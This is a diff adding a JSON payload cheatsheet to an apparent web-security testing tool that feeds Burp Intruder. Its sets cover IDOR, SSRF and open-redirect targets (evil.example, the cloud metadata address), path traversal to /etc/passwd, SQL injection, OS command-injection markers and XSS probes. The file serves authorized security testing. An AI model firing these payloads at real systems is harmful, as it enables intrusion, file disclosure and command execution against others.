@@ -1,0 +1,27 @@
+{
+  "_comment": "Payload cheatsheets for parameter classes (ParameterClassifier) and injection-category findings (FindingTaxonomy). Passive reference only — ReconHub never sends these itself; they are shown in a read-only dialog and registered as Burp Intruder payload sets (registration only, no traffic). Tune/add freely.",
+  "sets": [
+    { "class": "IDOR", "note": "Swap this value with another user's/account's own ID (using a second authenticated session) to test authorization, not identity guessing.",
+      "payloads": ["0", "1", "-1", "9999999", "00", "0x1", "<replace with another account's own id>"] },
+    { "class": "Redirect/SSRF", "note": "Watch for the app following the value server-side (SSRF) or the browser redirecting (open redirect).",
+      "payloads": ["https://evil.example/", "//evil.example", "///evil.example", "http://evil.example",
+        "https:evil.example", "http://169.254.169.254/latest/meta-data/", "http://localhost/",
+        "http://127.0.0.1/", "javascript:alert(1)", "/\\evil.example"] },
+    { "class": "File/Path", "note": "Path traversal / local file read candidates.",
+      "payloads": ["../../../../etc/passwd", "..%2f..%2f..%2f..%2fetc%2fpasswd", "....//....//etc/passwd",
+        "..\\..\\..\\..\\windows\\win.ini", "/etc/passwd", "file:///etc/passwd", "..;/etc/passwd"] },
+    { "class": "SQLi/Sort", "note": "Quick manual probes; for a full boundary-driven scan see InjectScope.",
+      "payloads": ["'", "\"", "' OR '1'='1", "' OR '1'='1'-- -", "' ORDER BY 1-- -", "' ORDER BY 99-- -",
+        "' UNION SELECT NULL-- -", "1 OR 1=1"] },
+    { "class": "Command", "note": "OS command injection markers (look for timing/output changes).",
+      "payloads": ["; id", "| id", "$(id)", "`id`", "; sleep 5", "| sleep 5", "&& ping -n 3 127.0.0.1"] },
+    { "class": "XSS", "findingTypeContains": ["reflected param"],
+      "note": "Reflected-XSS breakout probes for a parameter already observed reflecting unencoded.",
+      "payloads": ["<script>alert(1)</script>", "\"><script>alert(1)</script>", "'><svg/onload=alert(1)>",
+        "\"><img src=x onerror=alert(1)>", "javascript:alert(1)", "'-alert(1)-'"] },
+    { "class": "Open Redirect", "findingTypeContains": ["open redirect"],
+      "note": "Confirm the app actually redirects to an attacker-controlled host.",
+      "payloads": ["https://evil.example/", "//evil.example", "///evil.example", "https:evil.example",
+        "/%09/evil.example", "/\\evil.example"] }
+  ]
+}
